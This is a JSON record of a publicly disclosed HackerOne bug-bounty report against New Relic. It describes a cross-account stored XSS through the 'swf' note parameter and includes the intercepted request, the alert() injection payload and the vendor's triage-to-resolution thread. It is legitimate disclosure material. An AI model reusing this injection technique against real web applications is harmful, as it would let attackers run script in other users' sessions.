@@ -1,0 +1,402 @@
+{
+    "id": 710535,
+    "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83MTA1MzU=",
+    "url": "https://hackerone.com/reports/710535",
+    "title": "Cross-account stored XSS at notes (through \"swf\" note parameter)",
+    "state": "Closed",
+    "substate": "resolved",
+    "severity_rating": "high",
+    "readable_substate": "Resolved",
+    "created_at": "2019-10-09T14:11:30.911Z",
+    "submitted_at": "2019-10-09T14:11:30.911Z",
+    "is_member_of_team?": false,
+    "is_organization_group_member?": false,
+    "reporter": {
+        "disabled": false,
+        "username": "skavans",
+        "url": "/skavans",
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
+        },
+        "is_me?": false,
+        "cleared": false,
+        "verified": false,
+        "hackerone_triager": false,
+        "hacker_mediation": false
+    },
+    "team": {
+        "id": 17011,
+        "url": "https://hackerone.com/newrelic",
+        "handle": "newrelic",
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/variants/3813a300hyp02ziarjcgo7ph6uxv/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+            "medium": "https://profile-photos.hackerone-user-content.com/variants/3813a300hyp02ziarjcgo7ph6uxv/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "permissions": [],
+        "submission_state": "open",
+        "default_currency": "usd",
+        "awards_miles": false,
+        "offers_bounties": true,
+        "state": "public_mode",
+        "only_cleared_hackers": false,
+        "pentest_feature_enabled?": false,
+        "profile": {
+            "name": "New Relic",
+            "twitter_handle": "newrelic",
+            "website": "https://newrelic.com",
+            "about": "New Relic's Coordinated Disclosure Program"
+        }
+    },
+    "has_bounty?": true,
+    "in_validation?": false,
+    "can_view_team": true,
+    "can_view_report": true,
+    "is_external_bug": false,
+    "is_published": false,
+    "is_participant": false,
+    "has_collaborators": false,
+    "submitted_by_team_member": false,
+    "stage": 4,
+    "public": true,
+    "visibility": "full",
+    "cve_ids": [],
+    "singular_disclosure_disabled": true,
+    "disclosed_at": "2020-08-13T11:05:56.055Z",
+    "bug_reporter_agreed_on_going_public_at": "2020-08-11T09:34:07.422Z",
+    "team_member_agreed_on_going_public_at": "2020-08-13T11:05:55.959Z",
+    "comments_closed?": false,
+    "facebook_team?": false,
+    "team_private?": false,
+    "vulnerability_information": "Hey team,\n\nI've found one more stored XSS, this one is inside a note. Since notes could be published to be available for any NR user **(cross-accountly), the impact is quite severe**. You can see the publicly-available payload here:\nhttps://rpm.newrelic.com/public/notes/4qovMmDXV7P\n{F603334}\n\n##Steps to reproduce\n1) Sign into NR\n2) Navigate to some app (APM,mobile,etc.)\n3) Choose any chart that can be embed into a note, click `Add to note`, then click `Save and close`, intercept the request with Burp Suite, it is like the following:\n```http\nPOST /accounts/2385914/notes?agent_id=173790664 HTTP/1.1\nHost: rpm.newrelic.com\n<redacted>\n\nutf8=%E2%9C%93&authenticity_token=ebHrvqEzOZ9Aj%2BffyB6%2FoAOPe7ecrKlb7kyTJVeO7HY%3D&app_name=newapp&note_item%5Bswf%5D=&note_item%5Bbegin_time%5D=2019-10-08T07%3A00%3A45-07%3A00&note_item%5Bend_time%5D=2019-10-09T07%3A00%3A45-07%3A00&note_item%5Btitle%5D=Apdex+score&note_item%5Bdata_url%5D=%2Fchart_data%2Fbase_charts%2Fcombined_apdex_rainbow.json%3Faccount_id%3D2385914%26agent%3D173790664%26application_id%3D173790664%26chartBottomMargin%3D55%26chart_type%3DMSLine%26current_product%3Dapm_product%26hideXAxisLabels%3Dtrue%26include_metric_guids%255B%255D%3D5b224170646578225d%26include_metric_guids%255B%255D%3D5b22456e64557365722f4170646578225d%26labelStep%3D3%26live%3Dtrue%26no_click%3Dfalse%26number_suffix%3D%26omit_markers%3Dtrue%26render_to%3Dcurrent_apdex_score_173790664%26title%3D%26tooltipGroup%3Dcurrent_charts%26tw%255Bdur%255D%3Dlast_24_hours%26tw%255Bend%255D%3D1570629645%26zoom%3Dtrue%26no_click%3D1%26no_links%3D1&note_item%5Bcontext_url%5D=%2Faccounts%2F2385914%2Fapplications%2F173790664%3Ftw%255Bdur%255D%3Dlast_24_hours&note_item%5Bnote_text%5D=&note_action=create&note_id=6621&action_after=save_and_close\n```\n4) Add the following parameter to the intercepted request (you can add it after all other parameters, for instance):\n```\n&note_item%5Bswf%5D=</script><svg/onload=alert(document.domain)>\n```\n5) Server response contains created note ID, navigate to this note:\nhttps://rpm.newrelic.com/accounts/<ACC_ID>/notes/<NOTE_ID>\nand make sure the payload is executed\n6) Inspect the page source and make sure the payload is injected inside the following script:\n```html\n<script type=\"text/javascript\">\n      jQuery(function($) {\n        var chart_options = {\"swf\":\"</script><svg/onload=alert(document.domain)>WorldwithCountries\",\"width\":\"100%\",\"height\":200,\"fluid\":true,\"snappable\":false,\"loadingOverlay\":true,\"render\":true};\n        chart_options.dataUrl = '/accounts/2385914/notes/6625/items/19898/chart_data?tw%5Bdur%5D=last_24_hours&tw%5Bend%5D=1570629645';\n        $('#div_chart_note_item_19898_chart').chart(chart_options);\n      });\n    </script>\n```\n7) You can also publish this note and make sure that the payload is active also at public note version.\n\n##PoC video:\n{F603345}\n\n## Impact\n\nCross-account active stored XSS",
+    "weakness": {
+        "id": 62,
+        "name": "Cross-site Scripting (XSS) - Stored"
+    },
+    "original_report_id": null,
+    "original_report_url": null,
+    "attachments": [
+        {
+            "id": 603334,
+            "file_name": "______________2019-10-09___16.59.54.png",
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/2gbeEporRvv2brQxZKgQibM4?response-content-disposition=attachment%3B%20filename%3D%22______________2019-10-09___16.59.54.png%22%3B%20filename%2A%3DUTF-8%27%27______________2019-10-09___16.59.54.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTVJGXTX7%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T072033Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFzzfx26RrXvw7uz6McXptNAmaGsX5EsZcn%2B1e2FPdBSAiEA5AKGpNyobjXVm9I6KKSI9zAKTnq5B58izBx5zTM9YRkquQUIoP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDE4rojG3e45C1AJddSqNBWcpUvMwQMmykDcxc%2FC8kftCljW4cms6Yk1JhgJvZEKg23kYkL0XbqRUYuA7x6jq2wLdyyY3z6WjzlKiK0wxnwXJmcyU1F0Z5dNzW9KydwIcHLiOzp4Ey0JOnP3zfu5XBbDdXLwNRneQkqx4s%2FY5n4dpRxVwNMRSNcrzl6D0qgS7elyxoHrgKGapPgTO4cfRVNQQlNh%2FYRRt8DqlSz%2BuDN1RnR1ZDH9KyeEqDRXRbLcCfJIwXySYXHzqGon%2F81r1I5iCSJl2tykGCaBonqwz07HVMMebv%2FP7Vz%2BrX7UwMAMv2k3U7Pe1KSV%2FiwaSs73yirvx%2BnH3XxJwuWGHfkm7p8UwN1SZ%2BOL6R7pK4ZrFk51TILwXIkxh5%2BhcK4FZMIeaXUO3OeS2WbyQ7Vla9rPiKMH3tnsM06TYh2LFnKRqNTfJ48bTEdXAE94E0V5R4weAdx7bNMqc11YJ%2FWjdUpFFGBbJ%2F%2BnF8TeYBiPhElK5Rk0%2BAImyGK7x4KkAf%2F7el3s1yVt5zRGAcR5OFWcLBUm%2BDVxkmi3uMAFIhFDomFifn3oJT0qIvfJuf7JfXC2zGXs2zTFl2TNWMDWXScZ8wkCcz9A0%2FbrofHVrCrZ6%2BKXYTt1UFHHEesX1y9XAdblz3Is3BSQUl2hgcZVJBxJTXnpgXN0YcS5oLyq2PynlP34N1Jlw%2FEWt1HM3u1omKIaPo5e0sR6W2zFDr6jijsgNjuTFDmSTLJM8WgptSiN71y%2FkITJYTWvebfAmwWB4ASD9huKNB42EETMLZzSHLAyXfJnFqLVeG66eWRfYnEwqEhbusmwQGSy34VeFCGyz7mQ7sjd8E8t9u5l%2B8zhYewxaT9nLNKv8%2BXfkDhf5ZSdAaVTQMPirtqcGOrEBP0GEcUHrda0KRMaiNkKAHwyPowenqMl%2FCwnOYUXuL8p2iUuZFMrs%2BRcaNXJWLAKt3ih7yKkmksX2ZTMDbh%2BZcFqOdyhR4rSjXE7oSD2Gv5B75%2F10kZ9gGUiq%2BIWESxzF4GgUEL5XBbCuRWm8pRqfUphiVCpm%2BXekuj0xegYPqWqFypaouNumpTI1M4YM0Q4czqvenPqGJyVNuLbWVA59jYvwta2NF4qqI2%2BAg1mhFQZs&X-Amz-SignedHeaders=host&X-Amz-Signature=0b9be99c52d299850bd2b2649ab23ceb60d6a6c3c39847f64ff57774808fc3f0",
+            "file_size": 296241,
+            "type": "image/png"
+        },
+        {
+            "id": 603345,
+            "file_name": "nr_notes_xss.mp4",
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/7iZTxBahzcTb1hoS1ie2gTjP?response-content-disposition=attachment%3B%20filename%3D%22nr_notes_xss.mp4%22%3B%20filename%2A%3DUTF-8%27%27nr_notes_xss.mp4&response-content-type=video%2Fmp4&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTVJGXTX7%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T072033Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFzzfx26RrXvw7uz6McXptNAmaGsX5EsZcn%2B1e2FPdBSAiEA5AKGpNyobjXVm9I6KKSI9zAKTnq5B58izBx5zTM9YRkquQUIoP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDE4rojG3e45C1AJddSqNBWcpUvMwQMmykDcxc%2FC8kftCljW4cms6Yk1JhgJvZEKg23kYkL0XbqRUYuA7x6jq2wLdyyY3z6WjzlKiK0wxnwXJmcyU1F0Z5dNzW9KydwIcHLiOzp4Ey0JOnP3zfu5XBbDdXLwNRneQkqx4s%2FY5n4dpRxVwNMRSNcrzl6D0qgS7elyxoHrgKGapPgTO4cfRVNQQlNh%2FYRRt8DqlSz%2BuDN1RnR1ZDH9KyeEqDRXRbLcCfJIwXySYXHzqGon%2F81r1I5iCSJl2tykGCaBonqwz07HVMMebv%2FP7Vz%2BrX7UwMAMv2k3U7Pe1KSV%2FiwaSs73yirvx%2BnH3XxJwuWGHfkm7p8UwN1SZ%2BOL6R7pK4ZrFk51TILwXIkxh5%2BhcK4FZMIeaXUO3OeS2WbyQ7Vla9rPiKMH3tnsM06TYh2LFnKRqNTfJ48bTEdXAE94E0V5R4weAdx7bNMqc11YJ%2FWjdUpFFGBbJ%2F%2BnF8TeYBiPhElK5Rk0%2BAImyGK7x4KkAf%2F7el3s1yVt5zRGAcR5OFWcLBUm%2BDVxkmi3uMAFIhFDomFifn3oJT0qIvfJuf7JfXC2zGXs2zTFl2TNWMDWXScZ8wkCcz9A0%2FbrofHVrCrZ6%2BKXYTt1UFHHEesX1y9XAdblz3Is3BSQUl2hgcZVJBxJTXnpgXN0YcS5oLyq2PynlP34N1Jlw%2FEWt1HM3u1omKIaPo5e0sR6W2zFDr6jijsgNjuTFDmSTLJM8WgptSiN71y%2FkITJYTWvebfAmwWB4ASD9huKNB42EETMLZzSHLAyXfJnFqLVeG66eWRfYnEwqEhbusmwQGSy34VeFCGyz7mQ7sjd8E8t9u5l%2B8zhYewxaT9nLNKv8%2BXfkDhf5ZSdAaVTQMPirtqcGOrEBP0GEcUHrda0KRMaiNkKAHwyPowenqMl%2FCwnOYUXuL8p2iUuZFMrs%2BRcaNXJWLAKt3ih7yKkmksX2ZTMDbh%2BZcFqOdyhR4rSjXE7oSD2Gv5B75%2F10kZ9gGUiq%2BIWESxzF4GgUEL5XBbCuRWm8pRqfUphiVCpm%2BXekuj0xegYPqWqFypaouNumpTI1M4YM0Q4czqvenPqGJyVNuLbWVA59jYvwta2NF4qqI2%2BAg1mhFQZs&X-Amz-SignedHeaders=host&X-Amz-Signature=66a04444afa9c549d592cc0ffe4c00c634069fb493f0a9c346dd75df7633c93b",
+            "file_size": 21818891,
+            "type": "video/mp4"
+        }
+    ],
+    "allow_singular_disclosure_at": "2020-09-10T09:34:07.456Z",
+    "allow_singular_disclosure_after": -93563186.03190205,
+    "singular_disclosure_allowed": true,
+    "vote_count": 11,
+    "voters": [
+        "wi11",
+        "ali",
+        "cryptographer",
+        "pkhadka",
+        "vangogh001",
+        "hackerxbella",
+        "meispi",
+        "mr0bart",
+        "036467383637",
+        "last_comer",
+        "and 1 more..."
+    ],
+    "severity": {
+        "rating": "high",
+        "author_type": "User"
+    },
+    "structured_scope": {
+        "databaseId": 18678,
+        "asset_type": "URL",
+        "asset_identifier": "rpm.newrelic.com",
+        "max_severity": "critical"
+    },
+    "abilities": {
+        "assignable_team_members": [],
+        "assignable_team_member_groups": []
+    },
+    "activities": [
+        {
+            "id": 6004453,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Hi @skavans,\n\nThank you for your report.\n\nWe're currently taking a look at this issue and will let you know as soon as it's been forwarded to our engineering teams.",
+            "automated_response": false,
+            "created_at": "2019-10-10T14:29:41.423Z",
+            "updated_at": "2019-10-10T14:29:41.423Z",
+            "actor": {
+                "username": "nr-dm",
+                "cleared": false,
+                "verified": false,
+                "url": "/nr-dm",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "newrelic"
+        },
+        {
+            "id": 6100818,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Hey team,\nWhen can I await this to be triaged for?",
+            "automated_response": false,
+            "created_at": "2019-10-21T22:52:19.352Z",
+            "updated_at": "2019-10-21T22:52:19.352Z",
+            "actor": {
+                "username": "skavans",
+                "cleared": false,
+                "verified": false,
+                "url": "/skavans",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "newrelic"
+        },
+        {
+            "id": 6102284,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Can you please tell me at least an approximate triage date so I can plan my budget? I’m waiting for almost 2 weeks already.",
+            "automated_response": false,
+            "created_at": "2019-10-22T05:02:19.482Z",
+            "updated_at": "2019-10-22T05:02:19.482Z",
+            "actor": {
+                "username": "skavans",
+                "cleared": false,
+                "verified": false,
+                "url": "/skavans",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "newrelic"
+        },
+        {
+            "id": 6106405,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugTriaged",
+            "message": "Hi @skavans,\n\nThank you for your patience. While we strive to triage as soon as possible, this issue, and your others, are related to some legacy code and it can take some time to track down the issues.\n\nWe've now filed this against the appropriate engineering team and will provide more information after they've worked on the issue.\n\nThank you for your report!",
+            "automated_response": false,
+            "created_at": "2019-10-22T14:10:24.929Z",
+            "updated_at": "2019-10-22T14:10:24.929Z",
+            "actor": {
+                "username": "nr-dm",
+                "cleared": false,
+                "verified": false,
+                "url": "/nr-dm",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "newrelic"
+        },
+        {
+            "id": 6106411,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BountyAwarded",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2019-10-22T14:10:54.460Z",
+            "updated_at": "2019-10-22T14:10:54.460Z",
+            "actor": {
+                "url": "/newrelic",
+                "ibb": false,
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/3813a300hyp02ziarjcgo7ph6uxv/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "profile": {
+                    "name": "New Relic"
+                }
+            },
+            "bounty_currency": "usd",
+            "genius_execution_id": null,
+            "team_handle": "newrelic",
+            "collaborator": {
+                "username": "skavans",
+                "url": "/skavans"
+            }
+        },
+        {
+            "id": 6197511,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugResolved",
+            "message": "Another one bites the dust—we believe this to be fixed.\n\nThanks for all your help, @skavans!",
+            "automated_response": false,
+            "created_at": "2019-11-02T00:48:47.336Z",
+            "updated_at": "2019-11-02T00:48:47.336Z",
+            "actor": {
+                "username": "ahamlin",
+                "cleared": false,
+                "verified": false,
+                "url": "/ahamlin",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/037/071/b10c1e5872fac616ba0f3b67bb1e6e06ba70fe6c_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "reporter": {
+                "username": "skavans",
+                "url": "/skavans"
+            },
+            "genius_execution_id": null,
+            "team_handle": "newrelic"
+        },
+        {
+            "id": 8902554,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::AgreedOnGoingPublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2020-08-11T09:34:07.442Z",
+            "updated_at": "2020-08-11T09:34:07.442Z",
+            "first_to_agree": true,
+            "actor": {
+                "username": "skavans",
+                "cleared": false,
+                "verified": false,
+                "url": "/skavans",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "newrelic"
+        },
+        {
+            "id": 8923193,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Can we disclose this?",
+            "automated_response": false,
+            "created_at": "2020-08-13T08:31:04.193Z",
+            "updated_at": "2020-08-13T08:31:04.193Z",
+            "actor": {
+                "username": "skavans",
+                "cleared": false,
+                "verified": false,
+                "url": "/skavans",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "newrelic"
+        },
+        {
+            "id": 8924826,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::AgreedOnGoingPublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2020-08-13T11:05:55.986Z",
+            "updated_at": "2020-08-13T11:05:55.986Z",
+            "actor": {
+                "username": "nr-dm",
+                "cleared": false,
+                "verified": false,
+                "url": "/nr-dm",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "newrelic"
+        },
+        {
+            "id": 8924827,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ReportBecamePublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2020-08-13T11:05:56.085Z",
+            "updated_at": "2020-08-13T11:05:56.085Z",
+            "actor": {
+                "username": "nr-dm",
+                "cleared": false,
+                "verified": false,
+                "url": "/nr-dm",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "newrelic"
+        },
+        {
+            "id": 8924870,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "@dmcmahon\n\nI'm sorry, I didn't know that commenting on all these issues hinders you. I thought the only sending disclosure requests is invisible for you so I decided to comment on them additionally. I'll know this in future.",
+            "automated_response": false,
+            "created_at": "2020-08-13T11:10:32.800Z",
+            "updated_at": "2020-08-13T11:10:32.800Z",
+            "actor": {
+                "username": "skavans",
+                "cleared": false,
+                "verified": false,
+                "url": "/skavans",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "newrelic"
+        }
+    ],
+    "activity_page_count": 1,
+    "activity_page_number": 1,
+    "summaries": [
+        {
+            "category": "team",
+            "can_view?": true,
+            "can_create?": false
+        },
+        {
+            "category": "researcher",
+            "can_view?": true,
+            "can_create?": false
+        }
+    ]
+}
